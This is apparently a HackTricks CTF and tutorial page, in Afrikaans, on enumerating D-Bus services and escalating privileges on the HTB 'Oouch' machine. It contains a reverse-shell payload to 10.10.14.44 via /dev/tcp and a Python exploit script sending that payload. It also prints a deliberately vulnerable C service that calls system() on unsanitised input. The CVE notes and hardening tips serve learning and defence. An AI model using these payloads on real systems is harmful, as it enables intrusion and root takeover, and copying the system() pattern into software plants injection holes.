# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus word in Ubuntu-rekenaaromgewings as die tussenganger vir interproseskommunikasie (IPC) gebruik. In Ubuntu loop verskeie boodskapbusse gelyktydig: die stelselbus, wat hoofsaaklik deur **bevoorregte dienste gebruik word om dienste bloot te stel wat vir die hele stelsel relevant is**, en ’n sessiebus vir elke aangemelde gebruiker, wat slegs dienste blootstel wat vir daardie spesifieke gebruiker relevant is. Hier fokus ons hoofsaaklik op die stelselbus weens die verband daarvan met dienste wat met hoër voorregte (bv. root) loop, aangesien ons doel is om voorregte te verhoog. D-Bus se argitektuur gebruik ’n ‘router’ per sessiebus, wat verantwoordelik is om kliëntboodskappe na die toepaslike dienste te herlei op grond van die adres wat kliënte vir die diens waarmee hulle wil kommunikeer, spesifiseer.<sup>[[1]](#references)</sup>

Dienste op D-Bus word gedefinieer deur die **objekte** en **koppelvlakke** wat hulle blootstel. Objette kan vergelyk word met klasinstansies in gewone OOP-tale, waar elke instansie uniek deur ’n **objekpad** geïdentifiseer word. Hierdie pad, soortgelyk aan ’n lêerstelselpad, identifiseer elke objek wat die diens blootstel uniek. ’n Belangrike koppelvlak vir navorsingsdoeleindes is die **org.freedesktop.DBus.Introspectable**-koppelvlak, met een enkele metode, Introspect. Hierdie metode gee ’n XML-voorstelling terug van die metodes, seine en eienskappe wat die objek ondersteun. Hier fokus ons op metodes en laat ons eienskappe en seine buite rekening.

Vir kommunikasie met die D-Bus-koppelvlak is twee nutsmiddels gebruik: ’n CLI-nutsmiddel genaamd **gdbus** om metodes wat deur D-Bus blootgestel word maklik in skrifte aan te roep, en [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ’n Python-gebaseerde GUI-nutsmiddel wat ontwerp is om die dienste wat op elke bus beskikbaar is te enumereer en die objekte binne elke diens te vertoon.

```bash
sudo apt-get install d-feet
```

As jy die **session bus** nagaan, bevestig eers die huidige adres:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

In die eerste prent word dienste gewys wat by die D-Bus-stelselbus geregistreer is, met **org.debin.apt** spesifiek uitgelig nadat die System Bus-knoppie gekies is. D-Feet doen navrae aan hierdie diens vir objekte en vertoon koppelvlakke, metodes, eienskappe en seine vir die gekose objekte, soos in die tweede prent gesien kan word. Elke metode se handtekening word ook uiteengesit.

’n Opvallende kenmerk is die vertoning van die diens se **proses-ID (pid)** en **opdragreël**, wat nuttig is om te bevestig of die diens met verhoogde voorregte loop—belangrik vir die navorsingsrelevansie.

**D-Feet laat ook metode-aanroepings toe**: gebruikers kan Python-uitdrukkings as parameters invoer, wat D-Feet na D-Bus-tipes omskakel voordat dit aan die diens gestuur word.

Let egter daarop dat **sommige metodes verifikasie vereis** voordat ons hulle kan aanroep. Ons sal hierdie metodes ignoreer, aangesien ons doel juis is om ons voorregte sonder geloofsbriewe te verhoog.

Let ook daarop dat sommige dienste ’n ander D-Bus-diens, genaamd org.freedeskto.PolicyKit1, raadpleeg om te bepaal of ’n gebruiker sekere aksies mag uitvoer.

## **Cmd line Enumeration**

### Lys diensobjekte

Dit is moontlik om oop D-Bus-koppelvlakke te lys met:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

Dienste wat as **`(activatable)`** gemerk is, is besonder interessant omdat hulle **nog nie loop nie**, maar ’n bus-versoek hulle op aanvraag kan start. Moenie by `busctl list` stop nie; karteer daardie name na die werklike binaries wat hulle sou uitvoer.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

Dit wys vinnig watter `Exec=`-pad vir ’n aktiveerbare naam sal begin en onder watter identiteit. As die binêre lêer of sy uitvoeringsketting swak beskerm word, kan ’n onaktiewe diens steeds ’n privilege-escalation-pad word.

Vir ’n bevoorregte USB-imaging-diens, korreleer sy system-bus-naam met die **effektiewe** beleid vir sy image-writing-aksie. ’n Ou verskafferreël kan ’n administratiewe Unix-groep `ResultActive=yes` gee sonder dat ’n wagwoordprompt verskyn. Bevestig dat die huidige rekening aan daardie groep behoort, die sessie aktief is, die reël wel gelaai is en nie oorskryf word nie, en die geïnstalleerde helper steeds oproeper-gekose bron- en bestemmingspaaie aanvaar. Die diensbeskrywer of ’n ou pakketweergawe alleen bewys nie willekeurige lêertoegang nie. ’n Ontbrekende aktiveringsbeskrywer sluit ook nie ’n diens uit wat reeds loop nie. Inspekteer vaste beleids- en dienslêers sonder om die image-writing-metode aan te roep; sien die [oorspronklike diensontleding](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

#### Verbindings

[Uit wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wanneer ’n proses ’n verbinding met ’n bus opstel, ken die bus aan die verbinding ’n spesiale busnaam toe, genaamd ’n _unieke verbindingsnaam_. Busname van hierdie tipe is onveranderlik—dit is gewaarborg dat hulle nie sal verander solank die verbinding bestaan nie—en, nog belangriker, hulle kan nie gedurende die bus se leeftyd hergebruik word nie. Dit beteken dat geen ander verbinding met daardie bus ooit so ’n unieke verbindingsnaam toegeken sal kry nie, selfs al sluit dieselfde proses die verbinding met die bus en skep dit ’n nuwe een. Unieke verbindingsname is maklik herkenbaar omdat hulle met die andersins verbode dubbelpuntkarakter begin.<sup>[[4]](#references)</sup>

### Diensobjekinligting

Daarna kan jy inligting oor die koppelvlak verkry met:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

Korreleer die busnaam met sy `systemd`-eenheid en uitvoerbare pad:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

Dit beantwoord die operasionele vraag wat tydens privesc saak maak: **watter werklike binary en unit sal die handeling uitvoer as ’n method call slaag?**

### Lys koppelvlakke van ’n Service Object

Jy moet genoeg toestemmings hê.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Inspekteer die koppelvlak van ’n diensobjek

Let op hoe die nuutste koppelvlak wat met die `tree`-parameter ontdek is, in hierdie voorbeeld gekies is (_sien vorige afdeling_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Let op die metode `.Block` van die koppelvlak `htb.oouch.Block` (die een waarin ons belangstel). Die "s" van die ander kolomme kan beteken dat dit ’n string verwag.

Voordat jy enigiets gevaarliks probeer, toets eers ’n **leesgerigte** of andersins laerisiko-metode. Só kan jy die drie gevalle duidelik onderskei: verkeerde sintaksis, bereikbaar maar toegang geweier, of bereikbaar en toegelaat.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### Korrelleer D-Bus-metodes met beleide en aksies

Introspeksie wys jou **wat** jy kan aanroep, maar nie **waarom** 'n aanroep toegelaat of geweier word nie. Vir werklike privesc-triage moet jy gewoonlik **drie lae saam** ondersoek:

1. **Aktiveringsmetadata** (`.service`-lêers of `SystemdService=`) om uit te vind watter binêre lêer en eenheid werklik sal loop.
2. **D-Bus-XML-beleid** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) om uit te vind wie `own`, `send_destination` of `receive_sender` mag gebruik.
3. **Polkit-aksielêers** (`/usr/share/polkit-1/actions/*.policy`) om die verstekmagtigingsmodel te bepaal (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Nuttige opdragte:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Moenie **'n 1:1-kartering tussen 'n D-Bus-metode en 'n Polkit-aksie** aanvaar nie. Dieselfde metode kan 'n ander aksie kies, afhangend van die objek wat gewysig word of die runtime-konteks. Die praktiese werksvloei is dus:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` en grep die relevante `.policy`-lêers
3. laerisiko-live-probes met `busctl call`, `gdbus call` of `dbusmap --enable-probes --null-agent`

Proxy- of versoenbaarheidsdienste verdien ekstra aandag. 'n **root-running proxy** wat versoeke na 'n ander D-Bus-diens aanstuur oor sy eie voorafbestaande verbinding, kan die backend per ongeluk laat dink dat elke versoek van UID 0 af kom, tensy die oorspronklike caller-identiteit weer gevalideer word.<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

Met genoeg voorregte (slegs `send_destination`- en `receive_sender`-voorregte is nie genoeg nie) kan jy **'n D-Bus-kommunikasie monitor**.

Jy moet **root** wees om **'n kommunikasie te monitor**. As jy steeds probleme ondervind terwyl jy root is, raadpleeg [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) en [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> As jy weet hoe om 'n D-Bus-konfigurasielêer op te stel om **nie-root-gebruikers toe te laat om die kommunikasie af te luister**, **kontak my** asseblief!

Verskillende maniere om te monitor:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

In die volgende voorbeeld word die koppelvlak `htb.oouch.Block` gemonitor en **die boodskap "**_**lalalalal**_**" word weens wankommunikasie gestuur**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Jy kan `capture` in plaas van `monitor` gebruik om die resultate in ’n **pcapng**-lêer te stoor wat Wireshark kan oopmaak:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Filter al die geraas <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

As daar net te veel inligting op die bus is, gee ’n pasreël soos volg deur:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Verskeie reëls kan gespesifiseer word. As ’n boodskap met _enigeen_ van die reëls ooreenstem, sal die boodskap gedruk word. Soos volg:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Sien die [D-Bus-dokumentasie](http://dbus.freedesktop.org/doc/dbus-specification.html) vir meer inligting oor die sintaksis van match rules.<sup>[[7]](#references)</sup>

### Meer

`busctl` het nog meer opsies, [**vind hulle almal hier**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Kwesbare scenario**

As gebruiker **qtc binne die host "oouch" van HTB** kan jy ’n **onverwagte D-Bus-konfigurasielêer** vind wat in _/etc/dbus-1/system.d/htb.oouch.Block.conf_ geleë is:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Let op uit die vorige konfigurasie dat jy die gebruiker `root` of `www-data` moet wees om inligting via hierdie D-BUS-kommunikasie te stuur en te ontvang.

As gebruiker **qtc** binne die docker-container **aeb4525789d8** kan jy D-BUS-verwante kode in die lêer _/code/oouch/routes.py_ vind. Dit is die interessante kode:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Soos jy kan sien, **koppel dit aan ’n D-Bus-koppelvlak** en stuur die "client_ip" na die **"Block"-funksie**.

Aan die ander kant van die D-Bus-verbinding loop ’n C-gecompileerde binêre lêer. Hierdie kode **luister** op die D-Bus-verbinding **vir ’n IP-adres en roep iptables via die `system`-funksie aan** om die gegewe IP-adres te blokkeer.\
**Die oproep na `system` is doelbewus kwesbaar vir command injection**, so ’n payload soos die volgende sal ’n reverse shell skep: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploiteer dit

Aan die einde van hierdie bladsy kan jy die **volledige C-kode van die D-Bus-toepassing** vind. Binne-in kan jy tussen reëls 91–97 sien **hoe die `D-Bus object path`** **en `interface name`** **geregistreer word**. Hierdie inligting sal nodig wees om inligting na die D-Bus-verbinding te stuur:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Ook kan jy in reël 57 sien dat **die enigste metode wat** vir hierdie D-Bus-kommunikasie **geregistreer is**, `Block` **heet**(_**Daarom sal die payloads in die volgende afdeling na die diensobjek `htb.oouch.Block`, die koppelvlak `/htb/oouch/Block` en die metodenaam `Block` gestuur word**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

Die volgende Python-kode sal die payload na die D-Bus-verbinding stuur na die `Block`-metode via `block_iface.Block(runme)` (_let daarop dat dit uit die vorige stuk kode onttrek is_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl en dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` is ’n hulpmiddel wat gebruik word om boodskappe na “Message Bus” te stuur
- Message Bus – Sagteware wat stelsels gebruik om kommunikasie tussen toepassings maklik te maak. Dit hou verband met Message Queue (boodskappe word in volgorde gerangskik), maar in Message Bus word boodskappe volgens ’n intekeningmodel gestuur, en ook baie vinnig.
- Die “-system”-vlag dui aan dat dit ’n stelselboodskap is, nie ’n sessieboodskap nie (wat die verstek is).
- Die “–print-reply”-vlag word gebruik om ons boodskap behoorlik te vertoon en enige antwoorde in ’n mensleesbare formaat te ontvang.
- “–dest=Dbus-Interface-Block” Die adres van die Dbus-koppelvlak.
- “–string:” – Die tipe boodskap wat ons na die koppelvlak wil stuur. Daar is verskeie formate om boodskappe te stuur, soos double, bytes, booleans, int en objpath. Hiervan is die “object path” nuttig wanneer ons ’n lêerpad na die Dbus-koppelvlak wil stuur. Ons kan in hierdie geval ’n spesiale lêer (FIFO) gebruik om ’n opdrag na die koppelvlak oor te dra onder die naam van ’n lêer. “string:;” – Dit roep die object path weer aan waar ons die FIFO reverse shell-lêer/-opdrag plaas.

_Neem kennis dat in `htb.oouch.Block.Block`, die eerste deel (`htb.oouch.Block`) na die diensobjek verwys, en die laaste deel (`.Block`) na die metodenaam verwys._

### C code

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Geoutomatiseerde Enumereringshulpmiddels (2023-2025)

Om ’n groot D-Bus-aanvalsoppervlak handmatig met `busctl`/`gdbus` te enumereer, raak vinnig lastig. Twee klein FOSS-hulpprogramme wat die afgelope paar jaar vrygestel is, kan dinge tydens red-team- of CTF-opdragte bespoedig:

### dbusmap ("Nmap for D-Bus")
* Outeur: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Geskryf in C; ’n enkele statiese binary (<50 kB) wat deur elke objekpad loop, die `Introspect`-XML ophaal en dit aan die besittende PID/UID koppel.<sup>[[5]](#references)</sup>
* Nuttige vlae:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* Die nutsmerk onbeskermde welbekende name met `!` en wys onmiddellik watter dienste jy kan *own* (oorneem), of watter metode-oproepe vanaf ’n onbevoorregte shell bereikbaar is.

### uptux.py
* Outeur: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* ’n Slegs-Python-script wat na *skryfbare* paaie in systemd-eenhede **en** D-Bus-beleidlêers met te ruim toestemmings soek (bv. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Vinnige gebruik:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* Die D-Bus-module deursoek die onderstaande gidse en beklemtoon enige diens wat deur ’n gewone gebruiker gespoof of gekaap kan word:
  * `/etc/dbus-1/system.d/` en `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (verskaffer-oorskrywings)

---

## Opmerklike D-Bus-voorregte-eskalasie-foute (2024-2025)

Deur onlangs gepubliseerde CVE’s dop te hou, kan jy soortgelyke onveilige patrone in pasgemaakte kode raaksien. Twee goeie onlangse voorbeelde is:<sup>[[2]](#references)[[3]](#references)</sup>

| Jaar | CVE | Komponent | Grondoorsaak | Aanvallende les |
|------|-----|-----------|--------------|-----------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Die diens wat as root loop, het ’n D-Bus-koppelvlak blootgestel wat onbevoorregte gebruikers kon herkonfigureer, insluitend die laai van aanvaller-beheerde makrogedrag. | As ’n daemon **toestel-/profiel-/konfigurasiebestuur** op die stelselbus blootstel, behandel skryfbare konfigurasie en makrofunksies as primitiewe vir kode-uitvoering, nie bloot as “instellings” nie. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | ’n Verenigbaarheidsinstaanbediener wat as root loop, het versoeke na backend-dienste aangestuur sonder om die oorspronklike oproeper se sekuriteitskonteks te behou, sodat die backends die instaanbediener as UID 0 vertrou het. | Behandel D-Bus-dienste van die tipe **instaanbediener / brug / verenigbaarheid** as ’n afsonderlike foutklas: as hulle bevoorregte oproepe aanstuur, verifieer hoe die oproeper se UID/Polkit-konteks die backend bereik. |

Patrone om raak te sien:
1. Diens loop **as root op die stelselbus**.
2. Daar is óf **geen magtigingskontrole nie**, óf die kontrole word teen die **verkeerde subjek** uitgevoer.
3. Die bereikbare metode verander uiteindelik stelseltoestand: pakketinstallasie, gebruiker-/groepveranderinge, selflaaiprogramkonfigurasie, toestelprofielopdaterings, lêerskrywings of direkte opdraguitvoering.

Gebruik `dbusmap --enable-probes` of ’n handmatige `busctl call` om te bevestig of ’n metode bereik kan word, en ondersoek dan die diens se beleids-XML en Polkit-aksies om te verstaan **watter subjek** werklik gemagtig word.

---

## Vinnige wenke vir verharding en opsporing

* Soek vir wêreldskryfbare of *send/receive*-oop beleide:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Vereis Polkit vir gevaarlike metodes – selfs *root*-proxies moet die *caller* se PID aan `polkit_authority_check_authorization_sync()` deurgee in plaas van hul eie.
* Laat voorregte vaar in langlopende helpers (gebruik `sd_pid_get_owner_uid()` om namespaces te wissel nadat daar aan die bus gekoppel is).
* As jy nie ’n diens kan verwyder nie, beperk dit ten minste tot ’n toegewyde Unix-groep en beperk toegang in sy XML-beleid.
* Blue-team: neem die stelselbus vas met `busctl capture > /var/log/dbus_$(date +%F).pcapng` en voer dit in Wireshark in vir anomalie-opsporing.

---

## References

- [1] [USBCreator D-Bus-voorregte-eskalasie in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus-diens laat konfigurasie deur enige onbevoorregte gebruiker toe](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass in Deepin D-Bus Proxy-diens (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus-dokumentasie](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
